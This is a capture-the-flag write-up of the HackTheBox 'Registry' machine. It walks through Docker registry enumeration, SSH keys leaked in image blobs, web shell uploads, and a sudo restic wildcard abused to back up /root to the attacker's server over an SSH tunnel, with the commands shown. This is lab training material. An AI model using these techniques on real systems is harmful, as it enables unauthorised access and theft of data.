---
title: "HackTheBox: Registry"
date: "2020-04-04"
author: frosty
categories:
  - "writeups"
tags:
  - "hackthebox"
---

![Image](assets/img/writeups/hackthebox/registry/registry.png)

* * *

## Host Enumeration

Let us begin with an nmap scan to identify listening services. We get a result of three listening ports, interestingly three of which are HTTP services.

- 22: OpenSSH 7.6p1 Ubuntu
- 80: (http) nginx 1.14.0 (Ubuntu)
- 443: (ssl/http) nginx 1.14.0 (Ubuntu)

![Image](assets/img/writeups/hackthebox/registry/image.png)

* * *

### Enumeration - HTTP (80)

The initial landing page is the standard nginx index.html page. I could not see any special information within HTML comments, so instead I decided to run a `gobuster` scan.

```
$ gobuster dir \
  -w /usr/share/wordlists/dirb/common.txt
  -u http://10.10.10.159/
/bolt
/install
```

![Image](assets/img/writeups/hackthebox/registry/image-1.png)

![Image](assets/img/writeups/hackthebox/registry/image-2.png)

The /bolt directory goes to a bolt web application. The /install directory was not plaintext, and was clearly some other file format. I downloaded the /install/index.html file and analyzed it using the `file` command. The result showed that it was a .tar.gz file. After peeking inside, I saw that there is a `readme.md` file as well as a `ca.crt` certificate.

The readme included some Docker documentation. It looks like the ca.crt file was for `Registry`, however looks like it was never deployed on the http server...

![Image](assets/img/writeups/hackthebox/registry/image-3.png)

![Image](assets/img/writeups/hackthebox/registry/image-4.png)

* * *

### Enumeration - HTTPS (443)

When navigating to https://10.10.10.159/ we are presented with a insecure certificate. Of course this is likely to be a self-signed certificate. However, we'll inspect it anyways and when we do we see that the common name (CN) is `docker.registry.htb` -> so a certificate for a sub-domain.

![Image](assets/img/writeups/hackthebox/registry/image-6.png)

I couldn't see any further information on the initial page, so let's enumerate the `docker` subdomain. Firstly, I run a gobuster scan, and see that there is a hit on `/v2`. We have to use the `-k` flag to tell Gobuster to ignore the self-signed certificate warning.

```
gobuster dir \
  -w /usr/share/wordlists/dirb/common.txt \
  -u https://docker.registry.htb -k
```

![Image](assets/img/writeups/hackthebox/registry/image-7.png)

Alright, so we navigate to the `/v2` directory, and see that we are dealing with a docker V2 API.

![Image](assets/img/writeups/hackthebox/registry/image-8.png)

* * *

## Enumeration - Docker API

This part was quite new to me, so I struggled a lot here on my first try. However, I figured the best thing to do would be to understand what I am "exploiting". I assume that there is no exploit script that we can use, but rather I have to gather information which will somehow lead to the next stage. [The documentation can be viewed here](https://docs.docker.com/registry/spec/api/). There was a login form here, however a simple guess of `admin:admin` worked.

The first thing to do is to list the available the docker repositories on the box. This is achieved with a `_catalog` call. We can either use `curl` CLI tool or what I did instead was to use the browser URI.
`https://docker.registry.htb/v2/_catalog` which showed that there is one repository called `bolt-image`.

![Image](assets/img/writeups/hackthebox/registry/image-9.png)

The second thing to do is list the image tags. This is done with a call to `/<image-name>/tags/list` like
`https://docker.registry.htb/v2/bolt-image/tags/list`. This showed that there is only 1 tag; `latest`. I think that a docker tag can be a similar concept as branches in GitHub; there is the master branch, but there can also be developer or beta branches.

![Image](assets/img/writeups/hackthebox/registry/image-10.png)

The next stage that we must do is look at the `manifests` of the host. We do this by navigating to
`https://docker.registry.htb/v2/bolt-image/manifests/latest`. From here we are served with a JSON file containing blobs of the docker image. I understood the blobs to be backups or versions of the docker image. When we download one of the blobs, we see that there are some files representing a linux filesystem. I ended up downloading all of the blobs in the manifests file like this with the blobSum:
`https://docker.registry.htb/v2/bolt-image/blobs/sha256:302b[...]c66b`

![Image](assets/img/writeups/hackthebox/registry/image-11-1024x673.png)

* * *

## Enumeration - Docker Blobs & Getting the initial shell

After downloading the blobs, using the `file` command revealed that these are gzip compressed files. I opened them and looked through the files and going to interesting folders for example the `root` folder if it existed. What I was hoping to see was some sort of SSH key, credentials, or some other information which would leak information that could be used for port 22.

And there were two blob files which contained what I was looking for. In `2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791` there was a `/root/.ssh` folder, which contained `id_rsa` keys, as well as a `config` file.

After reading the config file, we see that there is a user configured for the registry.htb host. That user was `bolt`. I promptly tried to use the `id_rsa` key to login to the SSH service, however the `id_rsa` key was encrypted. I tried to brute force the key using ssh2john.py however was not able to get a password.

In another blob file `302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b` we find a bash script which uses the `id_rsa` key that we found and a passphrase to login to the host. We see that the password was:

![Image](assets/img/writeups/hackthebox/registry/image-12.png)

![Image](assets/img/writeups/hackthebox/registry/image-13.png)

![Image](assets/img/writeups/hackthebox/registry/image-14.png)

![Image](assets/img/writeups/hackthebox/registry/image-15.png)

* * *

## Privilege Escalation - Level 1

The first level of privilege escalation is in my opinion a bit counter-intuitive, but it all makes sense in the end. The first thing to do is some host enumeration. I ran the [linPEAS.sh](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) script which found an interesting hash lying in the bolt web application. Using john, we were able to crack the hash to get the administrator login `admin:strawberry`.
`/var/www/html/bolt/app/database/bolt.db`

![Image](assets/img/writeups/hackthebox/registry/image-16.png)

![Image](assets/img/writeups/hackthebox/registry/image-17.png)

We take a further look at the web application files, and see that in the `/var/www/html/` directory, there is a `backup.php` script. It seems that upon navigation, the web server performs some sort of backup to a restic server.

Interstingly, we see that the command executes using the `sudo` flag. We can assume that the www-data user has permissions to perform this sort of backup. Perhaps we can exploit this and redirect the backup files to our localhost...

![Image](assets/img/writeups/hackthebox/registry/image-18.png)

As we now have admin credentials for the bolt web application, we can login. It was a bit weird to find the login page, as it was hidden within a further bolt directory so:
`http://registry.htb/bolt/bolt/login`.

Upon logging in to the bolt web application, we see that there is a file management section, where the users are allowed to upload files. I planned to use a php reverse shell to get a www-data shell, however php files were not allowed to be uploaded. However, as we are admin user, we were allowed to change this setting in the configuration.yml file. After uploading a php reverse shell file, there were no connections back to my localhost. I suspected that there are strong iptables rules in place, which dont allow us to connect back to our machine. I had actually noticed this when I tried to transfer files (such as the bolt.db file) to my localhost. To overcome the iptables restrictions, I used a [b374k web configuration panel](https://github.com/b374k/b374k), which allowed us to setup a bind shell. I tested out my theory that `www-data` user has permission to perform a backup as sudo, and this was confirmed with the `sudo -l` command.

![Image](assets/img/writeups/hackthebox/registry/image-19.png)

* * *

## Privilege Escalation - Level 2

Interestingly, the command allowing us to run the restic backup as sudo uses the `*` wildcard, which means that we could put our own command in. At first I tried to escape with some `;` and perform `cat /root/root.txt`, however that would have been too easy and it didn't work.

I suppose that we can perform a backup of any files that we want on the localhost. Originally it was intended that backup.php only backs up the web application. That is no use to us anyway with our shells that we have. However, with the wildcard, we could potentially backup the /root directory to read the root flag. Let's remember that the iptables restrictions are tough, so we cannot simply perform a restic backup to our localhost. We can overcome this restriction by using SSH port forwarding. This is the method that we need to take

1. Install the restic application on our localhost, and setup a repo. Put the repository password in a text file on the registry host.
2. Start a rest-server to listen for backups on a port of your choice
3. Start the SSH port forwarder using bolt user credentials
4. Perform the restic backup of the `/root` directory to "localhost", data is forwarded to your machine.
5. Restore the snapshot to read the root flag.

Commands:

```sh
# Create a restic repo, and set a password
$ resitc -r /root/frosty init
  password: [redacted]

# Start rest-server on port 7000
$ rest-server --path /root/frosty --no-auth --listen 0.0.0.0:7000

# Start ssh port forward
$ ssh -i id_rsa 7000:localhost:7000 bolt@registry.htb

# Perform the backup using www-data shell
$ sudo /usr/bin/restic backup -r rest:http://127.0.0.1/ /root/ -p /tmp/pw.txt

# Restore from the backup
$ restic -r /root/frosty restore latest --target /tmp/work
```

It is worth noting that the rest-server does not show any activity when you perform the backup. However, you can confirm that the backup has been successful as there is a new file placed in the `snapshot` directory in the restic repository. The backup of files retain their `root` permissions, however as this is our host we are able to switch the root user and view the files. For completeness, I logged in as root user to registry with the `id_rsa` key; however we had the root flag on our localhost anyway so logging in was not strictly necessary.

![Image](assets/img/writeups/hackthebox/registry/image-22.png)

![Image](assets/img/writeups/hackthebox/registry/image-21.png)

![Image](assets/img/writeups/hackthebox/registry/image-23.png)

![Image](assets/img/writeups/hackthebox/registry/image-24-1024x147.png)

![Image](assets/img/writeups/hackthebox/registry/image-25.png)

* * *

## Final Thoughts

Wow, my first hard rated HTB machine. I was so proud when I rooted it, however after writing this writeup, it turns out that the host wasn't too difficult. The main focus here was enumeration, enumeration, enumeration. However, I still learned a lot with this host using the Docker API and the restic backup.

Very cool box! Hope you enjoyed reading.
